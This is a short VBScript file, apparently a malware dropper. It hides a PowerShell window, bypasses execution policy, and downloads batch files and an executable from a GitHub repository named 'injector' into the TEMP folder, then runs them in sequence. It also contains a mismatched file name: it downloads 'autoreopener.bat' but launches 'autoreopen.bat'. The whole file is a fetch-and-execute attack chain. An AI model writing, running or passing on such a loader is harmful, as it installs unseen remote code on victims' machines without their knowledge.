Set WshShell = CreateObject("WScript.Shell")

psCommand = "Invoke-WebRequest 'https://raw.githubusercontent.com/dexovision/injector/main/inh.bat' -OutFile ""$env:TEMP\inh.bat""; " & _
            "Invoke-WebRequest 'https://raw.githubusercontent.com/dexovision/injector/main/inh.exe' -OutFile ""$env:TEMP\inh.exe""; " & _
            "Invoke-WebRequest 'https://raw.githubusercontent.com/dexovision/injector/main/autoreopener.bat' -OutFile ""$env:TEMP\autoreopener.bat""; " & _
            "Invoke-WebRequest 'https://raw.githubusercontent.com/dexovision/injector/main/deltasks.bat' -OutFile ""$env:TEMP\deltasks.bat""; " & _
            "Start-Process ""$env:TEMP\inh.bat"" -Wait;" & _
            "Start-Process ""$env:TEMP\inh.exe"" -Wait;" & _
            "Start-Process ""$env:TEMP\autoreopen.bat"" -Wait;"


cmd = "powershell -NoProfile -ExecutionPolicy Bypass -Command """ & psCommand & """"

WshShell.Run cmd, 0, False
